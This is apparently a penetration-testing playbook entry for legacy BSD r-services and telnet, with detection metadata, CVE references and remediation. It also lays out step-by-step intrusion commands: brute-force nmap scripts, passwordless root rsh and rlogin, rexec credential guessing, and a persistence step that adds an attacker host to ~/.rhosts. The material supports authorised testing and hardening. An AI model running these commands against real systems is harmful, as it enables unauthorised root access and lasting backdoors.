---
id: os-bsd-rservices
technology: "BSD R-Services (rsh / rlogin / rexec / telnet)"
domain: IT
category: os
transport: ip
safety_class: intrusive
severity: critical
life_safety: false
match:
  ports: [23, 512, 513, 514]
  banners: ["rlogind", "rshd", "rexecd", "in.rlogind", "in.rshd", "in.rexecd", "login:", "Password:"]
  markers: ["rexec", "rlogin", "rsh", ".rhosts", "hosts.equiv", "rcmd", "shell/tcp", "exec/tcp", "login/tcp"]
quick_wins:
  - { cmd: "nmap -Pn -sV -p23,512,513,514 --script=banner,rexec-brute,rlogin-brute,rsh-brute {host}", safety: intrusive, note: "Service+version detection and default/weak credential brute for exec(512)/login(513)/shell(514); brute scripts generate auth attempts — confirm scope authorisation before running." }
  - { cmd: "nmap -Pn -sV -p23,512,513,514 --script=banner {host}", safety: safe, note: "Passive banner/version grab only — confirms rexecd/rlogind/rshd/telnetd presence without any authentication attempts." }
  - { cmd: "(echo; sleep 2) | telnet {host} 23", safety: safe, note: "Telnet (23) banner grab — captures the login prompt / OS uname banner that BSD telnetd leaks pre-auth." }
  - { cmd: "rlogin -l root {host}", safety: intrusive, note: "Direct rlogin (513) as root against a permissive .rhosts/hosts.equiv — a trusting host grants an interactive root shell with no password. Authorised targets only." }
  - { cmd: "rsh -l root {host} id", safety: intrusive, note: "Direct rsh (514) remote command execution as root — if the target trusts this source via .rhosts/hosts.equiv, `id` returns uid=0 proving passwordless RCE. Authorised targets only." }
  - { cmd: "rexec -l root -p {password} {host} id", safety: intrusive, note: "rexec (512) authenticated remote exec with a guessed credential — cleartext password on the wire; run only under scope authorisation." }
references:
  - "CVE-1999-0651 (rsh/rlogin service running)"
  - "CVE-1999-0180 (rlogind allows access without password via trusted host)"
  - "CVE-1999-0651 hosts.equiv / .rhosts host-based trust abuse"
  - "CERT CA-1992-09 (AIX rlogind/telnetd vulnerability)"
  - "CIS Benchmark: disable rexec, rlogin, rsh (r-services) and telnet"
mitre: "T1021.001"
---
# BSD R-Services (rsh / rlogin / rexec / telnet)

The BSD "r-services" — `rexec` (512/tcp), `rlogin` (513/tcp) and `rsh`/shell (514/tcp) — together with
`telnet` (23/tcp) are legacy remote-access daemons that predate SSH. They transmit everything, including
credentials, in cleartext, making them trivially sniffable on any shared segment. Their defining weakness
is *host-based trust*: `rlogind` and `rshd` consult `/etc/hosts.equiv` (system-wide) and per-user
`~/.rhosts` files, which list `hostname [username]` pairs that are allowed in **without any password**.
A single overly-permissive entry (a bare `+`, a wildcard, or a trusted hostname an attacker can spoof or
land on) turns `rlogin`/`rsh` into unauthenticated remote command execution. `rexec` (512) instead takes
a username/password pair in cleartext, so it is a target for credential guessing and sniffing. These
services still surface on legacy Unix, AIX, Solaris, HP-UX, appliance OSes, and neglected internal hosts.

**Why it matters.** Because trust is evaluated by source hostname/IP rather than by a secret, an attacker
who already holds a foothold on a "trusted" host — or who can spoof its address on a segment that permits
it — can `rsh -l root target cmd` and execute commands as root with no password prompt at all. Even where
`.rhosts` is not permissive, the cleartext protocols leak credentials and session content to any on-path
listener, and `rexec`/telnet expose a direct credential-brute surface. Running r-services is itself a
long-standing finding (CVE-1999-0651) and is prohibited by every modern hardening baseline (CIS, DISA STIG).

## Exploitation

Highest-probability foothold, safe-to-loud:

1. **Confirm the surface (safe).** `nmap -Pn -sV -p23,512,513,514 --script=banner {host}` — identify which
   of exec/login/shell/telnet are live and grab any OS/uname banner. A telnet banner grab
   `(echo; sleep 2) | telnet {host} 23` often leaks the exact OS and version to fingerprint likely `.rhosts`
   defaults.
2. **Test host-based trust (intrusive, authorised).** Attempt a passwordless exec first — it is the crown-jewel
   path: `rsh -l root {host} id`. If the target trusts your source via `hosts.equiv`/`.rhosts`, this returns
   `uid=0(root)` immediately, proving passwordless root RCE. Escalate to an interactive shell with
   `rlogin -l root {host}`. Also try common accounts (`bin`, `daemon`, `oracle`, an app service user) whose
   `~/.rhosts` may contain a stray `+`.
3. **Fall back to credential attacks (intrusive, authorised).** If trust is not permissive, brute the
   cleartext auth surface with `nmap --script=rexec-brute,rlogin-brute,rsh-brute -p512,513,514 {host}`, or
   validate a guessed/sniffed credential directly via `rexec -l root -p {password} {host} id`.
4. **Post-foothold.** With any shell, plant a persistent trust: appending your host to the account's
   `~/.rhosts` (`echo "attacker-host +" >> ~/.rhosts`) grants repeat passwordless access — note this as an
   authorised-engagement action and clean it up.

**Remediation.** Disable and remove `rexecd`, `rlogind`, `rshd`, and `telnetd` entirely; replace with SSH
(key-based auth). Delete all `/etc/hosts.equiv` and `~/.rhosts` files and block ports 23/512/513/514 at the
host and network firewall. If a legacy dependency truly requires remote exec, tunnel it over SSH rather than
relying on host-based trust.
